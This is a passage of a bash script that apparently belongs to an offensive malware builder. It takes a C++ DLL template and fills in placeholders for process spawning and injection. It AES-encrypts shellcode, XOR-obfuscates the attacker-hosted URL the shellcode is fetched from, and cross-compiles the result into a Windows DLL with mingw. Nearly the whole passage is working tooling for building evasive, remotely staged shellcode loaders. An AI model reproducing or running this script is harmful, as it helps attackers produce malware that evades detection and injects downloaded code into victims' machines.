...
#MALWARE=calc.exe
echo ""
echo -e ${green}"Name Your Entry Point"${clear}
cp DLL/template.cpp DLL/Resources/template.cpp
echo ""
read ENTRYPOINT
echo ""
...
sed -i "s/SPAWN/$SPAWN/g" DLL/Resources/template.cpp
...
printf "unsigned char ${ntde}[] = {${output_array}\n" > string.txt
SPAWN=$(cat string.txt)
sed -i "s/CREATETOOL/$CREATETOOL/g" DLL/Resources/template.cpp
...
sed -i "s/INJ3CT/$INJ3CT/g" DLL/Resources/template.cpp


echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
python3 DLL/Resources/aesencrypt.py $Shellcode > shell.txt
...
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" DLL/Resources/template.cpp
sed -i "s/ENTRYPOINT/$ENTRYPOINT/g" DLL/Resources/template.cpp
#Generate AES Payload
payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
cp DLL/conv.py DLL/Resources/con.py
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i DLL/Resources/con.py
sed -i "s/{/[/g" -i DLL/Resources/con.py
sed -i "s/}/]/g" -i DLL/Resources/con.py
sed -i "s/;//g" -i DLL/Resources/con.py
python3 DLL/Resources/con.py
#rm DLL/Resources/con.py
mv payload.bin $SHELLCODEFILE
sleep 2
sed -i "s/PORTY/$PORTY/g" DLL/Resources/template.cpp
#echo "Port"
sed -i "s/SHELLCODEFILE/$SHELLCODEFILE/g" DLL/Resources/template.cpp

input_file="/usr/share/dict/words"
output_file="/usr/share/dict/words_no_apostrophes"
template_file="DLL/Resources/template.cpp"
...
cp DLL/xor.py DLL/Resources/xor.py
...
sed -i "s/XKEYVAL/$xfile/g" DLL/Resources/xor.py
sed -i "s/XKEYVAL/$xfile/g" DLL/Resources/template.cpp

echo "$HOSTIP:$PORTY/$SHELLCODEFILE" > file.txt

# Encrypt the content of file.txt
python3 DLL/Resources/xor.py file.txt > encrypted_url.txt
...
sed -i "s/WEBSITE/$encrypted_url/g" DLL/Resources/template.cpp
rm file*
rm string.txt
rm encrypted*
...
x86_64-w64-mingw32-g++ -shared -o $MALWARE DLL/Resources/template.cpp -Wno-narrowing -static-libgcc -static-libstdc++ -lws2_32 -lntdll -lwininet Resources/resources.res -fpermissive -O2 -O3 -Os -D_WIN32_WINNT=0x0601 >/dev/null 2>&1
echo ""
sleep 2
rm shell*
